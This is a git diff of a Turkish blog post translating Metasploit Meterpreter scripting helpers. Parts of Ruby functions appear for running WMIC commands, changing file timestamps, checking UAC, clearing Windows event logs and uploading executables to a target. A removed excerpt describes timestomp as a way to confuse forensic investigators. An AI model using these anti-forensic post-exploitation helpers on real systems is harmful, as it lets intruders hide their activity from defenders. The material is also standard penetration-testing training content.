@@ -5,7 +5,7 @@ date: 2017-06-14 09:04:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,32 +13,19 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework timestomp
-- msf meterpreter timestomp
+- Metasploit Framework fonksiyonlar
+- msf meterpreter fonksiyonlar
 
-excerpt: Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek **forensics** araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter ```timestomp``` adı verilen bir komut sağlamaktadır.
+excerpt: Bu yazıda, script dosyalarınızda kullanabileceğiniz kullanışlı bazı fonksiyon örneklerine toplu halde bakacağız. Bu fonksiyonları ihtiyacınıza göre kullanabilirsiniz. Komutları inceleyerek ne gibi işlemler yapıldığını inceleyebilirsiniz.
 ---
 
-Useful Functions
-Meterpreter Scripting
+Kullanışlı Fonksiyonlar
 
-Let’s look at a few other functions which could be useful in building a Meterpreter script. Feel free to reuse these as needed.
+Bu yazıda, script dosyalarınızda kullanabileceğiniz kullanışlı bazı fonksiyon örneklerine toplu halde bakacağız. Bu fonksiyonları ihtiyacınıza göre kullanabilirsiniz. Komutları inceleyerek ne gibi işlemler yapıldığını inceleyebilirsiniz.
 
-Contents
+# Kullanılabilir WMIC Komutları
 
-1 Available WMIC Commands
-2 Change MAC Time of Files
-3 Check for UAC
-4 Clear All Event Logs
-5 Execute List of Commands
-6 Upload Files and Executables
-7 Write Data to File
- 
-
-Available WMIC Commands
-
-#-------------------------------------------------------------------------------
-
+```sh
 def wmicexec(session,wmiccmds= nil)
         windr = ''
         tmpout = ''
@@ -82,13 +69,11 @@ def wmicexec(session,wmiccmds= nil)
         c.close
         tmpout
 end
- 
+```
 
-Change MAC Time of Files
+# Dosyaların MAC Zamanlarını Değiştirme
 
-#-------------------------------------------------------------------------------
-
-# The files have to be in %WinDir%System32 folder.
+```sh
 def chmace(session,cmds)
     windir = ''
     windrtmp = ""
@@ -107,12 +92,11 @@ def chmace(session,cmds)
         end
     end
 end
- 
+```
 
-Check for UAC
+# UAC Kontrolü
 
-#-------------------------------------------------------------------------------
-
+```sh
 def checkuac(session)
     uac = false
     begin
@@ -136,12 +120,11 @@ def checkuac(session)
     end
     return uac
 end
- 
+```
 
-Clear All Event Logs
+# Tüm Olay Loglarını Temizleme
 
-#-------------------------------------------------------------------------------
-
+```sh
 def clrevtlgs(session)
     evtlogs = [
         'security',
@@ -164,12 +147,11 @@ def clrevtlgs(session)
 
     end
 end
- 
+```
 
-Execute List of Commands
+# Bir Komut Listesini Çalıştırma
 
-#-------------------------------------------------------------------------------
-
+```sh
 def list_exec(session,cmdlst)
     if cmdlst.kind_of? String
         cmdlst = cmdlst.to_a
@@ -192,12 +174,12 @@ def list_exec(session,cmdlst)
         end
     end
 end
- 
+```
 
-Upload Files and Executables
+# Dosyaları Karşı Tarafa Yükleme
 
-#-------------------------------------------------------------------------------
 
+```sh
 def upload(session,file,trgloc = nil)
     if not ::File.exists?(file)
             raise "File to Upload does not exists!"
@@ -223,12 +205,11 @@ def upload(session,file,trgloc = nil)
     end
     return fileontrgt
 end
- 
+```
 
-Write Data to File
+# Bir Dosyaya Veri Yazma
 
-#-----------------------------------------------------
-
+```sh
 def filewrt(file2wrt, data2wrt)
         output = ::File.open(file2wrt, "a")
         data2wrt.each_line do |d|
@@ -236,3 +217,4 @@ def filewrt(file2wrt, data2wrt)
         end
         output.close
 end
+```
